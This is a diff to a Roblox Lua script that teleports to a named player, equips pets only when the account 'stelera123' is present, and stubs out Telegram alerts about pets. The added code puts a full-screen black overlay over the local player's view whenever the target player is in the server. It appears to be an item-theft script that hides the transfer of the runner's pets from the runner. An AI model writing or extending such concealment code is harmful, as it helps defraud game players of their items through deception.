@@ -1,3 +1,6 @@
+task.wait(2)
+
+
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
@@ -25,6 +28,29 @@ local allowedTypesLower = {}
 for _, name in ipairs(ALLOWED_PET_TYPES) do
     allowedTypesLower[name:lower()] = true
 end
+
+local function createBlackScreen()
+    local player = Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+
+    -- Check if the black screen already exists
+    if playerGui:FindFirstChild("BlackScreenGUI") then
+        return -- already exists, do nothing
+    end
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "BlackScreenGUI"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = playerGui
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1, 0, 1, 0) -- full screen
+    frame.Position = UDim2.new(0, 0, 0, 0)
+    frame.BackgroundColor3 = Color3.new(0, 0, 0) -- black
+    frame.BorderSizePixel = 0
+    frame.Parent = screenGui
+end
+
 
 local function sendTelegramMessage(text)
 	print("[PET ALERT DEBUG] Would send Telegram message:", text)
@@ -151,6 +177,10 @@ if hasTool then
 end
 
 while true do
+	local target = Players:FindFirstChild(TargetPlayerName)
+if target then
+    createBlackScreen()
+end
     -- Teleport
     teleportToTarget()
     -- Equip allowed pet tools only if stelera123 exists
@@ -162,3 +192,4 @@ while true do
     end
     task.wait(0.1) -- check frequently
 end
+
